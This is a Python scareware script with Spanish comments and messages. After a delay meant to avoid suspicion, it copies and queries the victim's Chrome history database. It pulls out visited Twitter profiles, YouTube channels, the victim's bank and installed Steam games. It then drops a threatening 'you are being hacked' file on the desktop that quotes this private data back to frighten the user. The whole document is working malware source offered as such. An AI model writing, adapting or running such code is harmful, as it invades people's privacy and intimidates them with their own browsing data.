import os
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3
import re
import glob

HACK_FILE_NAME = "PARA TI.txt"


def check_steam_games(hacker_file):
    games = []
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common"
    try:
        games_paths = glob.glob(steam_path)
        games_paths.sort(key=os.path.getmtime, reverse=True)
        for games_path in games_paths:
            games.append(games_path.split("\\")[-1])

        if games:
            hacker_file.write("\nTambién me he fijado que te gusta jugar a {}... jajaja...\n".format(", ".join(games[:3])))
    except:
        return


def check_bank_account_and_scare_user(hacker_file, chrome_history):
    his_bank = None
    banks = ["BBVA", "CaixaBank", "Santander", "Bankia", "Sabadell", "Kutxabank", "Abanca", "UnicajaBanco", "Ibercaja"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break

    if his_bank:
        hacker_file.write("\nAdemás veo que guardas tu dinero en {}, interesante...\n".format(his_bank))


def check_youtube_channels_and_scare_user(hacker_file, chrome_history):
    channels_visited = []
    for item in chrome_history[:50]:
        results = re.findall("https://www.youtube.com/channel/[A-Za-z0-9\\-_]+$", item[2])
        if results:
            name_channel = re.findall("([A-Za-z0-9\\ +-_]+) - YouTube", item[0])
            channels_visited.append(name_channel[0])

    if channels_visited:
        hacker_file.write("\nHe visto que has estado en Youtube husmeando en los canales de {}...\n".format(
            ", ".join(channels_visited)))


def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:50]:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ("notifications", "home"):
            profiles_visited.append(results[0])

    if profiles_visited:
        hacker_file.write("\nHe visto que has estado husmeando en los perfiles de twitter de {}...\n".format(
            ", ".join(profiles_visited)))


def check_history_and_scare_user(hacker_file, chrome_history):
    hacker_file.write("\nHe visto que has visitado estas webs, interesante...\n\n")

    for item in chrome_history[:10]:
        hacker_file.write("{}\n".format(item[0]))


def delay_action():
    n_hours = randrange(1, 4)
    n_mins = randrange(0, 60)
    print("Durmiendo {} horas".format(n_hours) + " y {} minutos".format(n_mins))
    # n_sleep = (n_hours * 60 * 60) + (n_mins * 60)
    sleep(n_hours + (n_mins / 60))


def create_hacker_file(user_path):
    hacker_file = open(user_path + "\\OneDrive\\Escritorio\\" + HACK_FILE_NAME, "w")
    hacker_file.write("Siento comnicarle que su ordenador está siendo hickiado por mí.\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            return urls

        except sqlite3.OperationalError:
            print("Historial inacesible, reintentándolo en 5 segundos...")
            sleep(5)


def main():
    # Esperamos entre 1 y 3 horas para no levantar sospechas
    delay_action()
    # Calculamos la ruta del usuario de Windows
    user_path = "C:\\Users\\" + os.getlogin()
    # Recogemos su historial de google chrome, cuando sea posible...
    chrome_history = get_chrome_history(user_path)
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Escribiendo mensajes de miedo
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_youtube_channels_and_scare_user(hacker_file, chrome_history)
    check_bank_account_and_scare_user(hacker_file, chrome_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
